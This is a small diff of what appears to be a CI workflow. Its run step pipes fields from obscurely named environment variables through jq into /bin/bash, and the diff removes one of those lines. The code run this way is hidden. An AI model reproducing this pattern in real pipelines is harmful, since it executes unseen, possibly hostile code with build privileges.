@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$df3" | jq -r .ekfig34955 | /bin/bash
           printf '%s' "$fvrl316" | jq -r .rm2 | /bin/bash
-          printf '%s' "$fylq2509" | jq -r .k19759 | /bin/bash
           echo $b31651 | jq -r .k64 | /bin/bash
 
       - name: Save results
